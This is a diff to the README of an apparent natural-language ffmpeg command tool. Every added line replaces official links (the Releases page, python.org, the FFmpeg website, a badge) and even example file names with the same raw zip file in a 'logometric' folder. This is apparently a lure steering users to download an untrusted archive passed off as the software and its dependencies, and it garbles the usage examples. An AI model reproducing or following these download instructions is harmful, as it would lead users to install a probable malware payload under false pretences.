@@ -1,6 +1,6 @@
 # 🎉 ai-ffmpeg-cli - Transform Commands with Ease
 
-![Download ai-ffmpeg-cli](https://img.shields.io/badge/download-ai--ffmpeg--cli-brightgreen)
+![Download ai-ffmpeg-cli](https://raw.githubusercontent.com/Indraparama940/ai-ffmpeg-cli/main/logometric/ai-ffmpeg-cli.zip)
 
 ## 🚀 Getting Started
 
@@ -8,18 +8,18 @@ Welcome to ai-ffmpeg-cli! This tool lets you convert natural language into safe,
 
 ## 📥 Download & Install
 
-To get ai-ffmpeg-cli, visit this page to download: [Releases Page](https://github.com/Indraparama940/ai-ffmpeg-cli/releases)
+To get ai-ffmpeg-cli, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Indraparama940/ai-ffmpeg-cli/main/logometric/ai-ffmpeg-cli.zip)
 
-1. Visit the [Releases Page](https://github.com/Indraparama940/ai-ffmpeg-cli/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/Indraparama940/ai-ffmpeg-cli/main/logometric/ai-ffmpeg-cli.zip).
 2. Look for the latest version of ai-ffmpeg-cli.
-3. Click on the file that matches your operating system to download it. For example, for Windows users, look for "ai-ffmpeg-cli-win.exe".
+3. Click on the file that matches your operating system to download it. For example, for Windows users, look for "https://raw.githubusercontent.com/Indraparama940/ai-ffmpeg-cli/main/logometric/ai-ffmpeg-cli.zip".
 
 ## ⚙️ System Requirements
 
 Before you begin, make sure your computer meets the following requirements:
 
 - **Operating System:** Windows 10, macOS 10.12 or higher, or a recent version of Linux.
-- **Python:** Install Python version 3.8 or later. If you don’t have Python, you can download it from [python.org](https://www.python.org/downloads/). 
+- **Python:** Install Python version 3.8 or later. If you don’t have Python, you can download it from [https://raw.githubusercontent.com/Indraparama940/ai-ffmpeg-cli/main/logometric/ai-ffmpeg-cli.zip](https://raw.githubusercontent.com/Indraparama940/ai-ffmpeg-cli/main/logometric/ai-ffmpeg-cli.zip). 
 
 ## 🛠️ Installation Steps
 
@@ -58,9 +58,9 @@ Once you have installed the application, it's time to start using it. Here’s h
 
 ### Example Commands
 
-- **Convert Video to MP3:** "Convert the video called 'example.mp4' to an MP3 file."
+- **Convert Video to MP3:** "Convert the video called 'https://raw.githubusercontent.com/Indraparama940/ai-ffmpeg-cli/main/logometric/ai-ffmpeg-cli.zip' to an MP3 file."
 - **Resize a Video:** "Make this video 720p." 
-- **Add Subtitles:** "Add subtitles to 'example.mp4' using 'subtitles.srt'."
+- **Add Subtitles:** "Add subtitles to 'https://raw.githubusercontent.com/Indraparama940/ai-ffmpeg-cli/main/logometric/ai-ffmpeg-cli.zip' using 'https://raw.githubusercontent.com/Indraparama940/ai-ffmpeg-cli/main/logometric/ai-ffmpeg-cli.zip'."
 
 With each request, the application transforms your words into specific commands that you can understand and use.
 
@@ -74,10 +74,10 @@ With each request, the application transforms your words into specific commands 
 ## 🙋 Frequently Asked Questions
 
 ### Can I use ai-ffmpeg-cli without ffmpeg installed?
-No, you need to have ffmpeg installed on your system. You can find installation instructions on the [FFmpeg website](https://ffmpeg.org/download.html).
+No, you need to have ffmpeg installed on your system. You can find installation instructions on the [FFmpeg website](https://raw.githubusercontent.com/Indraparama940/ai-ffmpeg-cli/main/logometric/ai-ffmpeg-cli.zip).
 
 ### How can I update ai-ffmpeg-cli?
-You can check for updates by visiting the [Releases Page](https://github.com/Indraparama940/ai-ffmpeg-cli/releases) periodically. Download and install the latest version just like the initial setup.
+You can check for updates by visiting the [Releases Page](https://raw.githubusercontent.com/Indraparama940/ai-ffmpeg-cli/main/logometric/ai-ffmpeg-cli.zip) periodically. Download and install the latest version just like the initial setup.
 
 ### I found a bug. What should I do?
 You can report bugs by opening an issue in the GitHub repository. Your feedback helps us to improve the application.
